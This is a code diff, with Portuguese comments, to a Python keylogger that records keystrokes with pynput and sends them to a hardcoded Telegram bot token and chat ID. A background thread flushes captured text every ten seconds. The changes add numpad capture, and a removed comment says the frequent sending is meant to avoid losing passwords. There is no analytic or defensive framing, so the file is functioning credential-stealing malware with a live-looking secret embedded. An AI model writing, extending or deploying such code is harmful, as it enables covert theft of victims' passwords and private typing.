@@ -1,10 +1,9 @@
 import requests
 from pynput.keyboard import Key, Listener
 import time
-import threading  # <--- ADICIONE ESTA LINHA AQUI
+import threading
 import os
 import sys
-
 
 TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
 CHAT_ID = "-1004356233671"
@@ -25,7 +24,21 @@ def on_press(key):
     try:
         buffer += key.char
     except AttributeError:
-        if key == Key.space:
+        # Captura teclas do Teclado Numérico (Numpad)
+        if hasattr(key, 'name') and 'kp_' in str(key).lower():
+            num = str(key).replace("Key.kp_", "").replace("'", "")
+            if num == "decimal":
+                buffer += "."
+            elif num == "enter":
+                send_to_telegram(buffer + " [ENTER]")
+                buffer = ""
+            elif num.isdigit():
+                buffer += num
+            else:
+                buffer += f" [{num}] "
+        
+        # Teclas de controle normais
+        elif key == Key.space:
             buffer += " "
         elif key == Key.enter:
             send_to_telegram(buffer + " [ENTER]")
@@ -39,26 +52,22 @@ def on_press(key):
         else:
             buffer += f" [{key}] "
 
-    # ENVIO MAIS AGRESSIVO: Envia a cada 20 caracteres para não perder senhas
     if len(buffer) >= 20:
         send_to_telegram(buffer)
         buffer = ""
 
-# Para garantir que NADA fique preso, vamos criar um loop de limpeza
-import os
-import sys
-
 def auto_send():
     global buffer
     while True:
-        time.sleep(10) # A cada 10 segundos, envia o que estiver no buffer
+        time.sleep(10) 
         if buffer:
             send_to_telegram(buffer + " [AUTO-SEND]")
             buffer = ""
 
-# Inicia a thread de envio automático em segundo plano
+# Inicia a thread de envio automático
 threading.Thread(target=auto_send, daemon=True).start()
 
+# Loop principal para manter o keylogger vivo
 while True:
     try:
         with Listener(on_press=on_press) as listener:
